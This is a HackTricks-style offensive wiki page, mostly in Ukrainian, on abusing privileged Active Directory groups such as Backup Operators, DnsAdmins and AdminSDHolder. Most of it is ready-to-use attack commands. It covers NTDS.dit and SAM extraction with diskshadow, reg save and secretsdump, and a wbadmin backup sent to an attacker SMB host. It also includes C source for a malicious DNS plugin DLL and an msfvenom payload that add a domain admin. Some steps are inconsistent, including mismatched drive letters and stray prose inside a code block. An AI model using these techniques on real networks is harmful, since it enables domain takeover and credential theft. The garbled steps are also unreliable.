# Привілейовані групи

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}

## Відомі групи з адміністративними привілеями

* **Адміністратори**
* **Адміністратори домену**
* **Адміністратори підприємства**

## Оператори облікових записів

Ця група має право створювати облікові записи та групи, які не є адміністраторами домену. Крім того, вона дозволяє локальний вхід до контролера домену (DC).

Щоб визначити членів цієї групи, виконується наступна команда:
```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Додавання нових користувачів дозволено, а також локальний вхід до DC01.

## Група AdminSDHolder

Список контролю доступу (ACL) групи **AdminSDHolder** є критично важливим, оскільки він встановлює дозволи для всіх "захищених груп" в Active Directory, включаючи групи з високими привілеями. Цей механізм забезпечує безпеку цих груп, запобігаючи несанкціонованим змінам.

Зловмисник може скористатися цим, змінивши ACL групи **AdminSDHolder**, надаючи повні дозволи стандартному користувачу. Це фактично надасть цьому користувачу повний контроль над усіма захищеними групами. Якщо дозволи цього користувача будуть змінені або видалені, вони будуть автоматично відновлені протягом години через дизайн системи.

Команди для перегляду учасників і зміни дозволів включають:
```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
Скрипт доступний для прискорення процесу відновлення: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Для отримання додаткової інформації відвідайте [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

Членство в цій групі дозволяє читати видалені об'єкти Active Directory, що може розкрити чутливу інформацію:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Доступ до контролера домену

Доступ до файлів на DC обмежений, якщо користувач не є частиною групи `Server Operators`, що змінює рівень доступу.

### Підвищення привілеїв

Використовуючи `PsService` або `sc` з Sysinternals, можна перевіряти та змінювати дозволи на служби. Група `Server Operators`, наприклад, має повний контроль над певними службами, що дозволяє виконувати довільні команди та підвищувати привілеї:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Ця команда показує, що `Server Operators` мають повний доступ, що дозволяє маніпулювати службами для підвищених привілеїв.

## Backup Operators

Членство в групі `Backup Operators` надає доступ до файлової системи `DC01` завдяки привілеям `SeBackup` та `SeRestore`. Ці привілеї дозволяють проходження через папки, їх перелік та копіювання файлів, навіть без явних дозволів, використовуючи прапорець `FILE_FLAG_BACKUP_SEMANTICS`. Для цього процесу необхідно використовувати специфічні скрипти.

Щоб перерахувати членів групи, виконайте:
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Local Attack

Щоб використовувати ці привілеї локально, застосовуються наступні кроки:

1. Імпортуйте необхідні бібліотеки:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Увімкніть та перевірте `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Доступ і копіювання файлів з обмежених каталогів, наприклад:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

Прямий доступ до файлової системи контролера домену дозволяє вкрасти базу даних `NTDS.dit`, яка містить всі NTLM хеші для користувачів та комп'ютерів домену.

#### Using diskshadow.exe

1. Створіть тіньову копію диска `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Скопіюйте `NTDS.dit` з тіньової копії:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Альтернативно, використовуйте `robocopy` для копіювання файлів:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Витягніть `SYSTEM` та `SAM` для отримання хешів:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Отримати всі хеші з `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### Використання wbadmin.exe

1. Налаштуйте файлову систему NTFS для SMB-сервера на машині атакуючого та кешуйте облікові дані SMB на цільовій машині.
2. Використовуйте `wbadmin.exe` для резервного копіювання системи та витягування `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Для практичної демонстрації дивіться [ВІДЕО ДЕМО З IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Члени групи **DnsAdmins** можуть використовувати свої привілеї для завантаження довільного DLL з привілеями SYSTEM на DNS-сервері, який часто розміщується на контролерах домену. Ця можливість дозволяє значний потенціал для експлуатації.

Щоб перерахувати членів групи DnsAdmins, використовуйте:
```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Виконати довільний DLL

Члени можуть змусити DNS-сервер завантажити довільний DLL (як локально, так і з віддаленого ресурсу) за допомогою команд, таких як:
```powershell
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Перезапуск служби DNS (який може вимагати додаткових дозволів) є необхідним для завантаження DLL:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Для отримання додаткової інформації про цей вектор атаки зверніться до ired.team.

#### Mimilib.dll
Також можливо використовувати mimilib.dll для виконання команд, модифікувавши його для виконання конкретних команд або реверсних шелів. [Перегляньте цей пост](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) для отримання додаткової інформації.

### WPAD запис для MitM
DnsAdmins можуть маніпулювати DNS записами для виконання атак Man-in-the-Middle (MitM), створюючи WPAD запис після вимкнення глобального списку блокування запитів. Інструменти, такі як Responder або Inveigh, можуть бути використані для спуфінгу та захоплення мережевого трафіку.

### Читачі журналів подій
Члени можуть отримувати доступ до журналів подій, потенційно знаходячи чутливу інформацію, таку як паролі в чистому вигляді або деталі виконання команд:
```powershell
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions
Ця група може змінювати DACL на об'єкті домену, потенційно надаючи привілеї DCSync. Техніки ескалації привілеїв, що використовують цю групу, детально описані в репозиторії Exchange-AD-Privesc на GitHub.
```powershell
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-V Адміністратори
Hyper-V Адміністратори мають повний доступ до Hyper-V, що може бути використано для отримання контролю над віртуалізованими Контролерами Домену. Це включає клонування живих DC та витягування NTLM хешів з файлу NTDS.dit.

### Приклад експлуатації
Службу обслуговування Mozilla Firefox можна експлуатувати адміністраторами Hyper-V для виконання команд від імені SYSTEM. Це передбачає створення жорсткого посилання на захищений файл SYSTEM і заміну його на шкідливий виконуваний файл:
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
Note: Використання жорстких посилань було зменшено в останніх оновленнях Windows.

## Управління організацією

В середовищах, де розгорнуто **Microsoft Exchange**, спеціальна група, відома як **Управління організацією**, має значні можливості. Ця група має привілей **доступу до поштових скриньок усіх користувачів домену** та підтримує **повний контроль над 'Microsoft Exchange Security Groups'** Організаційною одиницею (OU). Цей контроль включає групу **`Exchange Windows Permissions`**, яка може бути використана для ескалації привілеїв.

### Експлуатація привілеїв та команди

#### Оператори друку
Члени групи **Оператори друку** наділені кількома привілеями, включаючи **`SeLoadDriverPrivilege`**, що дозволяє їм **локально входити в систему на Контролері домену**, вимикати його та керувати принтерами. Щоб експлуатувати ці привілеї, особливо якщо **`SeLoadDriverPrivilege`** не видно в умовах без підвищення привілеїв, необхідно обійти Контроль облікових записів користувачів (UAC).

Щоб перерахувати членів цієї групи, використовується наступна команда PowerShell:
```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Для більш детальних технік експлуатації, пов'язаних з **`SeLoadDriverPrivilege`**, слід звернутися до конкретних ресурсів безпеки.

#### Користувачі віддаленого робочого столу
Членам цієї групи надається доступ до ПК через протокол віддаленого робочого столу (RDP). Для перерахунку цих членів доступні команди PowerShell:
```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Додаткову інформацію про експлуатацію RDP можна знайти в спеціалізованих ресурсах з пентестингу.

#### Користувачі віддаленого керування
Члени можуть отримувати доступ до ПК через **Windows Remote Management (WinRM)**. Перерахування цих членів досягається через:
```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Для технік експлуатації, пов'язаних з **WinRM**, слід звернутися до конкретної документації.

#### Оператори серверів
Ця група має дозволи на виконання різних налаштувань на контролерах домену, включаючи привілеї резервного копіювання та відновлення, зміну системного часу та вимкнення системи. Щоб перерахувати учасників, використовується наступна команда:
```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## References <a href="#references" id="references"></a>

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
* [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
* [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
* [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
* [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
* [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
* [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
* [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)

<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Використовуйте [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection), щоб легко створювати та **автоматизувати робочі процеси**, які підтримуються **найсучаснішими** інструментами спільноти.\
Отримайте доступ сьогодні:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}

{% hint style="success" %}
Вивчайте та практикуйте Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вивчайте та практикуйте Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримати HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.

</details>
{% endhint %}
